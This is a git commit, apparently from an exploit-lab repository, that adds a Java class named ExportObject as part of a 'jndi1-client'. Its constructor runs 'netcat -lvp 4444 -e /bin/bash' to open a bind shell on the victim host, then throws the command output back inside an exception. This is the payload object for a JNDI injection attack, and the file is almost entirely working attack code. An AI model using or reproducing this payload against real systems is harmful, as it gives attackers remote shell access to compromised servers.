b5c115da59ce41a0e3e71d3f842a6bd1b30818c0
root <root@guest.guest>
2020-03-28 16:05:30 +0000

    Add jndi1-client

---
+++ src/main/java/ExportObject.java
@@ -0,0 +1,22 @@
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class ExportObject {
+    public ExportObject() throws Exception {
+        Process proc = Runtime.getRuntime().exec("netcat -lvp 4444 -e /bin/bash");
+        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+        StringBuffer sb = new StringBuffer();
+
+        String line;
+        while((line = br.readLine()) != null) {
+            sb.append(line).append("\n");
+        }
+
+        String result = sb.toString();
+        Exception e = new Exception(result);
+        throw e;
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+}
